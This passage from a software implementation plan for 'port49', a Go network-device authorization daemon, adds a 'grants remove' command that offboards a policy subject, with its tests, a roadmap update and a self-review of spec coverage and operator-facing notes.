	if strings.Contains(string(out), "name: svc_oxidized") || strings.Contains(string(out), "subject: svc_oxidized") ||
		strings.Contains(string(out), "system:serviceaccount") {
		t.Fatalf("the subject is still named:\n%s", out)
	}
	if !strings.Contains(string(out), "# Spec §11's complete policy example") {
		t.Fatalf("comments must survive the edit:\n%s", out)
	}
	p := spec11(t, out)
	if _, ok := p.Subject("svc_oxidized"); ok {
		t.Fatal("the subject block must go with its last grant")
	}
	for _, res := range p.RunTests(noon) {
		if !res.Pass {
			t.Errorf("a remaining test fails: %+v", res.Test)
		}
	}
	if _, ok := p.Subject("noc_tier1"); !ok || len(p.Grants("noc_tier1")) != 2 {
		t.Fatal("nobody else's rows are touched")
	}
}

func TestRemoveSubjectRefusesAnUndeclaredSubject(t *testing.T) {
	if _, _, err := RemoveSubject(spec11Raw(t), "svc_nobody"); err == nil || !strings.Contains(err.Error(), "not declared") {
		t.Fatalf("%v", err)
	}
}
```

<!-- patch: cmd/port49/policy_test.go -->
```diff
diff --git a/cmd/port49/policy_test.go b/cmd/port49/policy_test.go
index 7cb394d..5e35d90 100644
--- a/cmd/port49/policy_test.go
+++ b/cmd/port49/policy_test.go
@@ -179,3 +179,40 @@ func TestAccessReviewPrintsTheGrantRows(t *testing.T) {
 		t.Fatalf("an undeclared subject: code %d", code)
 	}
 }
+
+// `port49 grants remove` prints the policy without the subject, or replaces
+// the file with --write, and refuses a result that would not load.
+func TestGrantsRemoveOffboardsASubject(t *testing.T) {
+	pol, inv := policyFixture(t)
+	var out, errb bytes.Buffer
+	if code := run([]string{"grants", "remove", "--policy", pol, "--inventory", inv, "--subject", "ops"}, &out, &errb); code != 0 ||
+		strings.Contains(out.String(), "ops@example.com") || !strings.Contains(out.String(), "noc@example.com") ||
+		!strings.Contains(errb.String(), "ops: 1 grant row(s), the subject block, and 0 test(s) removed") {
+		t.Fatalf("code %d\nstdout %s\nstderr %s", code, out.String(), errb.String())
+	}
+	before, _ := os.ReadFile(pol)
+	if !strings.Contains(string(before), "ops@example.com") {
+		t.Fatal("without --write the file is left alone")
+	}
+	out.Reset()
+	if code := run([]string{"grants", "remove", "--policy", pol, "--inventory", inv, "--subject", "ops", "--write"}, &out, &errb); code != 0 || out.Len() != 0 {
+		t.Fatalf("--write: code %d %s", code, out.String())
+	}
+	after, _ := os.ReadFile(pol)
+	if strings.Contains(string(after), "ops@example.com") {
+		t.Fatalf("--write replaced nothing:\n%s", after)
+	}
+	if info, _ := os.Stat(pol); info.Mode().Perm() != 0o600 {
+		t.Fatalf("the file's mode changed: %v", info.Mode())
+	}
+	// noc is the last subject: removing it leaves a policy that declares none,
+	// which does not load, so nothing is written.
+	errb.Reset()
+	if code := run([]string{"grants", "remove", "--policy", pol, "--inventory", inv, "--subject", "noc", "--write"}, &out, &errb); code != 1 ||
+		!strings.Contains(errb.String(), "nothing was written") {
+		t.Fatalf("code %d %s", code, errb.String())
+	}
+	if kept, _ := os.ReadFile(pol); string(kept) != string(after) {
+		t.Fatal("a refused removal must not touch the file")
+	}
+}
```

- [ ] **Step 2: Run them to see them fail**

Run: `go test ./internal/policy/ ./cmd/port49/ -count=1`
Expected: FAIL to build — `undefined: RemoveSubject`.

- [ ] **Step 3: Write the edit and the command**

<!-- write: internal/policy/edit.go -->
```go
package policy

import (
	"bytes"
	"errors"
	"fmt"

	"gopkg.in/yaml.v3"
)

// Removal is what RemoveSubject took out of a policy file.
type Removal struct {
	Grants, Tests int
}

// RemoveSubject is `port49 grants remove --subject` (spec §12): the policy
// file with every grant row naming the subject deleted and then, because none
// remains, the subject block itself, so nothing is left behind to match. The
// file's tests naming the subject go too; left, they would name a subject
// that is no longer declared and the file would not load. It edits the YAML
// tree rather than re-rendering the policy, so comments and the order of
// everything else survive; indentation is re-rendered at two spaces. The
// caller writes the result where a pull request will review it.
func RemoveSubject(raw []byte, subject string) ([]byte, Removal, error) {
	var doc yaml.Node
	if err := yaml.Unmarshal(raw, &doc); err != nil {
		return nil, Removal{}, err
	}
	if doc.Kind != yaml.DocumentNode || len(doc.Content) == 0 || doc.Content[0].Kind != yaml.MappingNode {
		return nil, Removal{}, errors.New("the policy file is not a YAML mapping")
	}
	top := doc.Content[0]
	var r Removal
	declared := false
	for i := 0; i+1 < len(top.Content); i += 2 {
		list := top.Content[i+1]
		if list.Kind != yaml.SequenceNode {
			continue
		}
		switch top.Content[i].Value {
		case "grants":
			r.Grants += filter(list, "subject", subject)
		case "tests":
			r.Tests += filter(list, "subject", subject)
		case "subjects":
			declared = filter(list, "name", subject) > 0
		}
	}
	if !declared {
		return nil, Removal{}, fmt.Errorf("subject %q is not declared", subject)
	}
	var buf bytes.Buffer
	enc := yaml.NewEncoder(&buf)
	enc.SetIndent(2)
	if err := enc.Encode(&doc); err != nil {
		return nil, Removal{}, err
	}
	if err := enc.Close(); err != nil {
		return nil, Removal{}, err
	}
	return buf.Bytes(), r, nil
}

// filter drops every mapping in list whose key is value, and says how many.
func filter(list *yaml.Node, key, value string) int {
	kept := list.Content[:0]
	removed := 0
	for _, item := range list.Content {
		if item.Kind == yaml.MappingNode && field(item, key) == value {
			removed++
			continue
		}
		kept = append(kept, item)
	}
	list.Content = kept
	return removed
}

func field(m *yaml.Node, key string) string {
	for i := 0; i+1 < len(m.Content); i += 2 {
		if m.Content[i].Value == key {
			return m.Content[i+1].Value
		}
	}
	return ""
}
```

<!-- patch: cmd/port49/policy.go -->
```diff
diff --git a/cmd/port49/policy.go b/cmd/port49/policy.go
index 7042cd9..417c32a 100644
--- a/cmd/port49/policy.go
+++ b/cmd/port49/policy.go
@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"path/filepath"
 	"strings"
 	"text/tabwriter"
 	"time"
@@ -249,3 +250,82 @@ func accessReview(args []string, stdout, stderr io.Writer) int {
 	tw.Flush()
 	return 0
 }
+
+// grantsRemove is the offboarding path for machine subjects and literal
+// identities (spec §12): the policy file with every grant row naming the
+// subject deleted, and the subject block with them. It prints the new file on
+// stdout for a pull request, or with --write replaces the file in place; the
+// result must load against the inventory before anything is written. What it
+// removed goes to stderr.
+func grantsRemove(args []string, stdout, stderr io.Writer) int {
+	fs := flag.NewFlagSet("port49 grants remove", flag.ContinueOnError)
+	fs.SetOutput(stderr)
+	var files policyFiles
+	files.register(fs)
+	subject := fs.String("subject", "", "the subject to offboard, by its name in the policy")
+	write := fs.Bool("write", false, "replace the policy file instead of printing the result")
+	if err := fs.Parse(args); err != nil {
+		return 2
+	}
+	if *subject == "" || files.policy == "" || files.inventory == "" || fs.NArg() != 0 {
+		fmt.Fprint(stderr, usage)
+		return 2
+	}
+	raw, err := os.ReadFile(files.policy)
+	if err != nil {
+		fmt.Fprintln(stderr, "port49 grants remove:", err)
+		return 1
+	}
+	out, removed, err := policy.RemoveSubject(raw, *subject)
+	if err != nil {
+		fmt.Fprintln(stderr, "port49 grants remove:", err)
+		return 1
+	}
+	inv, err := admission.LoadFile(files.inventory)
+	if err != nil {
+		fmt.Fprintln(stderr, "port49 grants remove:", err)
+		return 1
+	}
+	if _, err := policy.Parse(out, policy.Env{Devices: inv.Devices}); err != nil {
+		fmt.Fprintf(stderr, "port49 grants remove: the policy without %s does not load, so nothing was written: %v\n",
+			*subject, err)
+		return 1
+	}
+	if *write {
+		if err := replaceFile(files.policy, out); err != nil {
+			fmt.Fprintln(stderr, "port49 grants remove:", err)
+			return 1
+		}
+	} else {
+		stdout.Write(out)
+	}
+	fmt.Fprintf(stderr, "port49 grants remove: %s: %d grant row(s), the subject block, and %d test(s) removed\n",
+		*subject, removed.Grants, removed.Tests)
+	return 0
+}
+
+// replaceFile writes data beside path and renames it over path, so a policy
+// file is never left half-written, and keeps path's mode.
+func replaceFile(path string, data []byte) error {
+	info, err := os.Stat(path)
+	if err != nil {
+		return err
+	}
+	tmp, err := os.CreateTemp(filepath.Dir(path), filepath.Base(path)+".*")
+	if err != nil {
+		return err
+	}
+	defer os.Remove(tmp.Name())
+	if _, err := tmp.Write(data); err != nil {
+		tmp.Close()
+		return err
+	}
+	if err := tmp.Chmod(info.Mode().Perm()); err != nil {
+		tmp.Close()
+		return err
+	}
+	if err := tmp.Close(); err != nil {
+		return err
+	}
+	return os.Rename(tmp.Name(), path)
+}
```

<!-- patch: cmd/port49/main.go -->
```diff
diff --git a/cmd/port49/main.go b/cmd/port49/main.go
index 6c91b5f..ec2ac13 100644
--- a/cmd/port49/main.go
+++ b/cmd/port49/main.go
@@ -37,6 +37,7 @@ const usage = `usage:
   port49 policy test --policy FILE --inventory FILE
   port49 policy replay [--line N] LOGFILE|-
   port49 access review --policy FILE --inventory FILE --subject NAME
+  port49 grants remove --policy FILE --inventory FILE --subject NAME [--write]
 `
 
 func main() { os.Exit(run(os.Args[1:], os.Stdout, os.Stderr)) }
@@ -62,6 +63,10 @@ func run(args []string, stdout, stderr io.Writer) int {
 		if len(args) > 1 && args[1] == "review" {
 			return accessReview(args[2:], stdout, stderr)
 		}
+	case "grants":
+		if len(args) > 1 && args[1] == "remove" {
+			return grantsRemove(args[2:], stdout, stderr)
+		}
 	}
 	fmt.Fprint(stderr, usage)
 	return 2
```

- [ ] **Step 4: Run the whole gate**

Run: `make test && make vet && go test -race ./internal/... ./cmd/... -count=1 && go vet -tags lab ./tests/lab/... && make build`
Expected: every package `ok`; no gofmt or vet output; no race; `bin/port49d` and `bin/port49` built.

- [ ] **Step 5: Commit**

```bash
git add internal/policy/edit.go internal/policy/edit_test.go cmd/port49/
git commit -m "feat: port49 grants remove

Offboards a subject: every grant row naming it, then its block, and
the tests naming it, as an edit to the YAML tree that keeps comments.
The result must load against the inventory before it is printed or,
with --write, renamed into place (spec §12).

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 20: The roadmap records what plan 4 built and hands forward

**Files:**
- Modify: `docs/superpowers/plans/README.md` (the "Plan 4" section)

**Interfaces:**
- Produces: plan 4's "As built" paragraph, and what plans 5, 6 and 7 inherit from it, where
  the next plan writer starts (`CLAUDE.md`).

- [ ] **Step 1: Apply the roadmap edit**

<!-- patch: docs/superpowers/plans/README.md -->
```diff
diff --git a/docs/superpowers/plans/README.md b/docs/superpowers/plans/README.md
index 175d24d..e21de1d 100644
--- a/docs/superpowers/plans/README.md
+++ b/docs/superpowers/plans/README.md
@@ -199,7 +199,7 @@ hand.
 `nxapi_auth` cookie (lab register rule 3), with decision 15 provisional on it; L1's RESTCONF
 clause measured on IOS-XE (`L1-restconf-cisco_iosxe.md`), and L1 open on the console.
 
-## Plan 4 — Policy engine (§19 step 4)
+## Plan 4 — Policy engine (§19 step 4) — `2026-09-23-04-policy-engine.md`
 
 Spec §3 (normalization), §4 (grammar, pipeline stages), §5.1–§5.5 (mint resolution, blob
 compilation, refresh, credential identity, scopes and `attached_roles`, version comparison),
@@ -224,6 +224,38 @@ is enforced up to the last hop and not across it.
   becomes reachable when they stop sharing one.
 - **A `GetBlob` store error answers `store_unavailable`** once the store is remote.
 
+**As built:** the executor is `internal/engine` (the blob format and the one evaluator the
+daemon, `port49 policy replay` and `port49 explain` all run) and the authoring side is
+`internal/policy`; plan 3's `internal/blob`, `author.Blob` and `internal/broker/policy` are gone.
+`author.Engine` is the daemon's authorizer. `author.Lab` survives only as the lab's instrument
+for seeded contexts, behind an optional `lab:` block (plan 4, Decided 12). The accounting spool
+drains to a `decision.Sink` and stops at a refused record. Authorization answers
+`store_unavailable` ERROR (plan 4, Question 3).
+
+**Hands to plan 5:**
+
+- `internal/platform/dialect.go` is borrowed ahead and is plan 5's to replace with the layered
+  adapters: `pipe_authorized` is false on EOS, NX-OS and IOS-XE (measured,
+  `tests/lab/results/L2-*.md`); `expands_abbreviations` is false everywhere until L21 closes per
+  platform; entity classes are names from spec §8 and the lab configs, unverified against a device;
+  only `arista_eos` renders levels, and `operator` renders nowhere (plan 4, Question 1), so a policy
+  landing an EOS session at `operator` is refused at load.
+- **L21**, added by plan 4: type an abbreviation on each platform and record what the
+  authorization request and the accounting record carry.
+- The CI reports spec §12 names and no plan yet owns — the effective-permission diff, the
+  shadowed-deny report, the privilege-expansion gate, and the dead-rule and fallback-exposure
+  intersection checks (plan 4, Question 4).
+
+**Hands to plan 6:** the joint policy-and-inventory checks refuse a policy at load
+(`policy.checkDevices`); plan 6 turns a failure into a quarantined device (spec §13, decision 20).
+`security_log` is accepted and emits nothing until a sync can change a scope's membership. `bundle`
+on every blob and record is the policy file's `sha256:` until versioned bundles replace it.
+
+**Hands to plan 7:** group subjects load, and are evaluated by name in the offline tools, but mint
+for no one until the directory resolves membership; `api:` rights are validated and reported, not
+enforced; `max_session_age` per role is refused at load by name; policy reload; `/v1/explain` over
+the API (the offline `port49 explain` exists).
+
 ## Plan 5 — Platform adapters (§19 step 5)
 
 Spec §8 in full: built-in adapters, entity classes, user overrides and layering, pinned
```

If Ryan has ruled on a Question for Ryan by the time this task runs, write the ruling into the
matching bullet in place of the question's reference.

- [ ] **Step 2: Check and commit**

Run: `grep -n 'Hands to plan 5\|Hands to plan 6\|Hands to plan 7\|As built' docs/superpowers/plans/README.md`
Expected: the four paragraphs, under "## Plan 4".

```bash
git add docs/superpowers/plans/README.md
git commit -m "docs: the roadmap records plan 4 and hands forward

What plan 4 built, and what plans 5, 6 and 7 inherit from it: the
borrowed dialect table and L21, the joint checks plan 6 turns into
quarantine, and the group subjects, api: rights and reload that wait
for plan 7.

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---
## Self-review

**Roadmap coverage**

| Roadmap item | Task |
|---|---|
| §3 normalization (`<cr>`, pipe split, case, abbreviations, argument boundaries) | 6 (`Normalize.Normalize`, `abbreviates`); 1 (§3 rule 4) |
| §4 grammar and pipeline stages | 5 (`ParseRule`), 6 (`match`, `pipePermits`), 8 (`DefaultPipe`, rank lint) |
| §5.1 mint resolution | 9 (`compose`), 10 (`Resolve`), 13 (the broker mints through it) |
| §5.1.2 blob compilation | 5 (format v2), 10 (`compile`) |
| §5.1.3 refresh; §5.1.4 credential identity | unchanged: refresh is plan 7's (roadmap); `Resolve` is what a refresh will call |
| §5.4 dominance | 6 (`Dominates`, `Command`); 1 (§5.4 ties) |
| §5.5 scopes, `attached_roles`, `on_missing`, version comparison | 7, 9; 11 (the incomparable report); 1 (§5.5) |
| §5.7 the decision log in full, replay | 2 (policy block, `Sink`), 12 (records carry it), 13 (mint `bundle`, blob re-emission), 17 (replay) |
| §6 levels, `parent:`, attribute layering, substitution | 8 (levels), 10 (`layerAttributes`, `render`), 5 (`SessionAttributes`), 12 (substituted per session), 13 (checked at mint) |
| §11 as a test corpus | 11 |
| §12 `explain`, policy tests, access review, `grants remove --subject` | 15, 16, 18, 19 |
| §14 "Matching and precedence", "Decision log" assertions | table below |
| Replace `author.Lab` with the real `Authorizer` | 12, 13 (`author.Engine`); 14 (`lab:` optional); Decided 12 |
| The spool's failing sink, no advance past a refusal | 2, 3 |
| Carried: blob platform checked against the device's | 12 (`blob_platform_mismatch`), 1 (§5.7 row) |
| Carried: a `GetBlob` store error answers `store_unavailable` | 12 (ERROR, Decided 13) |
| Produces the compiled blob plan 2 stores | 13 (`engine.Encode` into `putBlob`) |
| Spec text the plan changes | 1 (spec §3, §5.4, §5.5, §5.7, §6, §8, §11, §15; design §19), 20 (roadmap) |

**Spec §14 assertions, and where each is tested**

| Assertion | Test |
|---|---|
| Full-vector matching | `engine.TestRulesMatchTheFullVector` |
| Case insensitivity; `(?-i)`; the vector unaltered | `engine.TestComparisonIsCaseInsensitiveAndTheVectorIsNot` |
| Dominance, permitting | `engine.TestANarrowerPermitDominatesABroaderDeny` |
| Dominance, denying (all four), equal tuples, class = regex | `engine.TestNoPermitDominatesTheseDenies` |
| Dominance, buying it back | `engine.TestAnExceptionMustBeAsPreciseAtEveryPosition` |
| Rank lint | `policy.TestLoadRefusesByName` ("a regex that is *", "… a word") |
| Order independence | `engine.TestEvaluationIsOrderIndependent`, `policy.TestShufflingThePolicyChangesNoDecision` |
| Entity classes per platform; undefined class a load error | `platform.TestManagementIsDefinedPerPlatform`, `policy.TestJointChecksRefuseAtLoad` |
| Pipeline enforcement, chained stages | `engine.TestEveryPipelineStageIsChecked` |
| Abbreviation handling | `engine.TestAnAbbreviationCannotSlipPastADeny` |
| Attribute layering, shadowing reported | `policy.TestAttributesLayerAndRecordWhatTheyShadow`, `TestLintReportsWhatAReviewerMustSee` |
| 255-byte limit at load (and at mint) | `engine.TestCheckAttribute`, `broker.TestASessionReplyThatWillNotFitIsRefusedAtMint` |
| Privilege composition, `parent:`, unresolvable level | `policy.TestAPrincipalHoldsTheGrantsWhoseScopeSelectsTheDevice`, `TestCustomLevelsReplaceTheOrdering`, `TestJointChecksRefuseAtLoad` |
| `enable: auto` refused at load where not `principal` | `policy.TestEnableAutoIsRefusedWhereTheEnableUsernameIsNotThePrincipal` |
| Username resolution and uniqueness | `policy.TestLoadRefusesByName` ("a machine without a username", "a shared username") |
| Replay agreement | `replay.TestEveryRecordReplaysToTheSameDecision` |
| Replay divergence detected | `replay.TestTamperingIsDetected` |
| Reason codes closed | Task 1 before Task 2; `decision.TestAnAuthorizationRecordCarriesItsMatchedRules` |
| Blob lifetime follows the context (a restarted replica resolves it) | `author.TestACachedBlobOutlivesAStoreOutage` for the cache; the store TTL is plan 3's (Decided 8 there), unchanged |
| Attached roles by trust domain; no grant, no access | `policy.TestAttachedRolesFollowTheTrustDomainAndNeverAddADevice` |
| Attached permit reported, deny-only not | `policy.TestLintReportsWhatAReviewerMustSee` |
| State-scoped mitigation; `on_missing` | `policy.TestAnIncomparableVersionIsIncludedAndSaysSo`, `TestOnMissingExcludesByDefault` |

**Placeholder scan:** none. Every code block is the file or the patch as built and tested; the
only prose instruction without a block is Task 13's `git rm`, which is the block.

**Type consistency, checked:** `engine.Blob{Version, Bundle, Platform, Normalize, Privilege,
Attributes, Rules, Pipe, Classes}` is built only by `policy.compile` (Task 10) and read by
`engine.Compile`, `author.Engine`, the broker and `replay`; `engine.Outcome` and `Match` are
produced by `Program.Command` (Task 6) and read by `Outcome.Policy`, `ServerMsg`, `author.Engine`,
`policy.Decide`, `Explain` and `replay`; `policy.Resolve(principal string, d admission.Device, now
time.Time) (Resolution, error)` has that signature in Tasks 10, 11, 13 and 15;
`decision.PolicyRule{Rule []string, Specificity []int, Role}` is produced only by `Match.record`;
`author.Request{Context, Device, Raw, Vector}` is built only by `Handle` and read by `Engine` and
`Lab`; `decision.Sink` is taken by `acct.NewSpool` and asserted by `broker.putBlob`;
`policy.Env{Devices, Dialects, EnableUsernames}` is filled by `buildBroker` (Task 13), the CLI's
`policyFiles.load` (Task 15) and the tests.

**Things an implementer must not miss.**

- Task 12 changes one existing test's expectation, `TestGetContextStoreErrorIsNotContextMissing`:
  FAIL becomes ERROR. That is Decided 13, not a regression.
- Task 13 is the only task that changes what the running system does for a broker-minted login;
  do not split it. The daemon and the broker must switch blob formats in one commit.
- Task 13 deletes whole packages. `git rm -r` them; a stray file left in `internal/broker/policy`
  still compiles as a package and keeps the old policy loadable.
- Task 10's patch to `load.go` is two lines inside `Parse`; the file is otherwise Task 8's.
- `engine.Compile` wants a blob as `Decode` returns it — version set. A hand-built `Blob` in a
  test goes through `Encode` and `Decode` first (the tests' `program` and `Decide` helpers do).
- `author.Engine.Metrics` is required; it counts every lookup.
- The corpus's `operator → priv-lvl=7` lives only in `spec11_test.go`'s `spec11Env`. Do not add
  it to `internal/platform`: that is Question 1.

**Unmeasured, and not relied on:** whether any platform sends abbreviations (L21 — the default
fails closed, Decided 5); whether any output modifier reaches port49 on any platform (the table
says none does, from L2's one modifier); what a vEOS session at `priv-lvl=7` can reach (Question
1); whether a device falls through on an authorization ERROR (L4 covers authentication only;
Question 3); the interface names behind `@physical`, `@loopback` and `@management` beyond the
lab's own management interfaces (plan 5 verifies them).

---

## Execution

Runs on Go 1.22 with no new dependencies, on branch `feature/policy-engine`. Twenty tasks: one
spec task first, eighteen code tasks (2–19), one roadmap task last, one commit each. No task needs
the lab host. The code gate, after Task 13 and again after Task 19, is `make test && make vet`,
`go test -race ./internal/... ./cmd/...`, `go vet -tags lab ./tests/lab/...` and `make build`,
reported with their real output.

**The PR body carries an "Operator-facing notes" section** (roadmap, top; plan 13 builds the
documentation from it). For this plan it lists at least:

- **Policy file:** the full §11 grammar — `privilege_levels` with `parent:`, `scopes` (`match`
  with equality, lists, `lt`/`lte`/`gt`/`gte` versions and `re`; `on_missing`; `security_log`;
  `attached_roles` by `humans`/`machines`), roles with `@class` and `/re/` terms, `pipe:` and
  `attributes:`, group and identity subjects with `api:`, grants with `expires` and `attributes`,
  and `tests:`. **`all_devices` must now be declared**, `scopes: [{name: all_devices, match: {}}]`;
  a plan-3 policy without it is refused with that line in the error. Refused by name:
  `platform_set`, `platforms`, `key_groups` (keep them in the inventory file), a role's
  `max_session_age`. A group subject loads but mints for no one until plan 7.
- **Load-time refusals against the inventory:** a class a platform in inventory does not define, a
  level it cannot render (`operator` on `arista_eos` — Question 1), a ceiling below the landing
  level, `enable: auto` where the enable username is not the principal, and a regex that is only
  a costlier `*` or word. `port49d` refuses to start on any of them, naming subject and device.
- **Decisions:** specificity dominance replaces plan 3's deny-overrides — a more specific permit now
  overrides a broader deny, which plan 3 never allowed; a deny is a default, and `port49 policy
  test` and `explain` show which permit beats it. Output modifiers are allow-listed per role (the
  shipped default: `include`, `exclude`, `begin`, `section`, `json`, `count`, `no-more`) — and on
  EOS, NX-OS and IOS-XE the device applies them itself, so a pipe rule protects nothing there
  (`tests/lab/results/L2-*.md`). An abbreviation of a deny's word is denied on every platform until
  L21 is measured (Question 2), and the `server_msg` names the deny.
- **`server_msg` on a denial** now names the deciding rule and role: `port49: denied by <role>
  (<rule>) - see 'port49 explain'`.
- **Authorization answers ERROR, not FAIL, when the store cannot be read** (Question 3): a device
  with a local fallback authorizes by its own role during a store outage. A blob a replica has
  cached keeps answering through one.
- **New reason** `blob_platform_mismatch`; new metric `port49_blob_cache_lookups_total{outcome}`;
  new mint item error `attribute_too_long` in `port49_broker_item_errors_total{error}`.
- **Decision records** carry `policy.bundle` (the policy file's `sha256:`), `policy.blob`, and the
  matched deny and permits with their tuples and roles; grants on a mint record carry `expires`.
- **New commands**, all offline over files: `port49 explain`, `port49 policy test`, `port49 policy
  replay`, `port49 access review`, `port49 grants remove`.
- **`lab:` is optional in `port49d.yaml`.** Without it a context with no blob is denied; with it,
  seeded lab tokens keep the lab's fixed answers. A broker-minted token is always answered by the
  policy engine.
- **The accounting spool** now retries a record the decision-log sink refused rather than dropping
  it; a sink that stays down leaves the records on disk.
- **Spec corrections, for Ryan:** §8's EOS example said `pipe_authorized: true`, which the lab
  contradicts; §11's `svc_oxidized` lacked the username §14 requires. Both are corrected in Task
  1, and register row L21 is new. No plan yet owns spec §12's CI diff reports (Question 4).
